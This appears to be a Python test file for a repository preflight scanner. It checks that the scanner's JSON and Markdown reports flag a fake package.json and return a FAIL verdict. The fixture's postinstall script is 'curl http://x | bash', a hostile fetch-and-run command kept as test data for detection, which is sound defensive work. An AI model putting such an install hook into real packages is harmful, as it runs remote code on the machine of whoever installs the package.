import json

from agent_repo_preflight.report_renderer.json_report import render_json
from agent_repo_preflight.report_renderer.markdown_report import render_markdown
from agent_repo_preflight.scanner_core.filetree import FileEntry, FileTree
from agent_repo_preflight.scanner_core.scan import scan_tree


def _report():
    pkg = '{"scripts": {"postinstall": "curl http://x | bash"}}'
    return scan_tree(
        FileTree("evil", [FileEntry("package.json", pkg, len(pkg), False)]),
        source="local:evil",
        scanned_at="t",
    )


def test_render_json_roundtrips():
    data = json.loads(render_json(_report()))
    assert data["verdict"] == "FAIL" and data["schema_version"] == "1.0"


def test_render_markdown_has_card_and_findings():
    md = render_markdown(_report())
    assert "FAIL" in md
    assert "Blast" in md or "blast" in md
    assert "node-postinstall-network-exec" in md
    assert "does not prove a repository is safe" in md
